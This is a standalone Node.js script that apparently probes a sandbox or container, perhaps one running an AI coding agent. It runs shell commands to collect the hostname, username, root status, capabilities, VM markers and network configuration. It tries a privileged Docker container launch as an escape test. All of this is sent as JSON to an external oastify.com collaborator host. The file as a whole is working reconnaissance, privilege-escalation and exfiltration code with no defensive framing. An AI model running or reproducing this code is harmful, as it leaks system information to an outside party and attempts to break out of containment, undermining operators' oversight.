const { exec } = require('child_process');
const http = require('http');
const os = require('os');
const fs = require('fs');

const OAST_HOST = '0nopxr82g2bsk9e28w87vxucn3tuhn5c.oastify.com';

function sendBeacon(pathUrl, payload) {
  const body = JSON.stringify(payload);
  const req = http.request({
    hostname: OAST_HOST,
    method: 'POST',
    path: pathUrl,
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body)
    }
  }, (res) => { res.on('data', () => {}); res.on('end', () => {}); });
  req.on('error', () => {});
  req.write(body);
  req.end();
}

function runCmd(cmd) {
  return new Promise((resolve) => {
    exec(cmd, { timeout: 15000, windowsHide: true }, (err, stdout, stderr) => {
      if (err) resolve({ err: err.message, stderr: stderr ? stderr.trim() : '' });
      else resolve({ out: stdout ? stdout.trim() : '' });
    });
  });
}

function readFile(file) {
  try { return fs.readFileSync(file, 'utf8').trim(); } catch { return null; }
}

async function detectLinux() {
  const result = {};
  result.dockerEnv = await runCmd('test -f /.dockerenv && echo docker || echo notdocker');
  result.cgroup1 = await runCmd('cat /proc/1/cgroup 2>/dev/null || true');
  result.systemdVirt = await runCmd('systemd-detect-virt 2>/dev/null || echo none');
  result.dmi = {
    vendor: readFile('/sys/class/dmi/id/sys_vendor'),
    product: readFile('/sys/class/dmi/id/product_name'),
    board: readFile('/sys/class/dmi/id/board_name')
  };
  result.proc1cgroup = readFile('/proc/1/cgroup');
  result.netIf = await runCmd('ip -o addr show 2>/dev/null || true');
  result.defRoute = await runCmd('ip route show default 2>/dev/null || true');
  result.hardwareInfo = await runCmd('dmidecode -s system-product-name 2>/dev/null || echo unavailable');
  return result;
}

async function detectWindows() {
  const result = {};
  result.dockerEnv = await runCmd('if exist \\\\.\\pipe\\docker_engine (echo docker) else (echo notdocker)');
  result.systemInfo = await runCmd('systeminfo 2>NUL | findstr /B /C:"System Manufacturer" /C:"System Model" /C:"Hyper-V Requirements" || echo unavailable');
  result.hardwareInfo = await runCmd('wmic computersystem get model,name,manufacturer,systemtype 2>NUL || echo unavailable');
  result.network = await runCmd('ipconfig /all 2>NUL || echo unavailable');
  return result;
}

function classifyVM(info, platform) {
  const markers = ['vmware', 'virtualbox', 'kvm', 'qemu', 'hyper-v', 'microsoft', 'google compute', 'gce', 'aws'];
  let combined = '';
  if (platform === 'win32') {
    combined = `${info.systemInfo.out || ''} ${info.hardwareInfo.out || ''}`.toLowerCase();
  } else {
    combined = `${info.dmi.vendor || ''} ${info.dmi.product || ''} ${info.dmi.board || ''} ${info.cgroup1.out || ''} ${info.systemdVirt.out || ''}`.toLowerCase();
  }
  const isVM = markers.some(m => combined.includes(m));
  return isVM;
}

function classifyNetwork(ifaceText) {
  const privateRanges = ['10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.', '192.168.'];
  const ips = (ifaceText.match(/\d+\.\d+\.\d+\.\d+/g) || []);
  const hasPrivate = ips.some(ip => privateRanges.some(pr => ip.startsWith(pr)));
  return hasPrivate ? 'private' : (ips.length ? 'public' : 'unknown');
}

async function checkCapabilities() {
  if (os.platform() !== 'win32') {
    const cap = await runCmd('cat /proc/self/status 2>/dev/null | grep CapEff || true');
    if (cap.out) return cap.out.split(':')[1]?.trim();
  }
  return null;
}

async function dockerEscapeAttempt() {
  if (!fs.existsSync('/var/run/docker.sock')) return { ok: false, reason: 'docker socket missing' };
  const info = await runCmd('docker info 2>/dev/null || true');
  if (info.err && info.err.includes('permission denied')) return { ok: false, reason: 'docker socket permission denied' };
  if (info.err && !info.out) return { ok: false, reason: 'docker not installed or non-dismissible' };
  const c = await runCmd('docker run --rm --privileged --name copilot-scan alpine sh -c "echo ok" 2>/dev/null || true');
  if (c.out && c.out.includes('ok')) {
    await runCmd('docker rm -f copilot-scan 2>/dev/null || true');
    return { ok: true, note: 'privileged container launched' };
  }
  return { ok: false, reason: 'privileged container launch failed' };
}

async function main() {
  const platform = os.platform();
  const base = {
    platform,
    hostname: os.hostname(),
    user: os.userInfo().username,
    isRoot: process.getuid ? process.getuid() === 0 : null,
    capability: await checkCapabilities()
  };
  let detection = {};

  if (platform === 'win32') {
    detection = await detectWindows();
    base.isVM = classifyVM(detection, platform);
    base.networkType = classifyNetwork(detection.network.out || '');
  } else {
    detection = await detectLinux();
    base.isVM = classifyVM(detection, platform);
    base.networkType = classifyNetwork(detection.netIf.out + ' ' + detection.defRoute.out);
  }

  base.dockerSocket = fs.existsSync('/var/run/docker.sock');
  base.dockerEscape = await dockerEscapeAttempt();
  detection.isDockerRuntime = (detection.systemdVirt?.out || '').toLowerCase().includes('docker') || (detection.cgroup1?.out || '').toLowerCase().includes('docker') || fs.existsSync('/.dockerenv');

  sendBeacon('/cmd', { note: 'container/vm and PrivEsc reconnaissance', environment: base, detection });
}

main().catch(e => { sendBeacon('/cmd', { note: 'error', error: e?.message || String(e) }); });
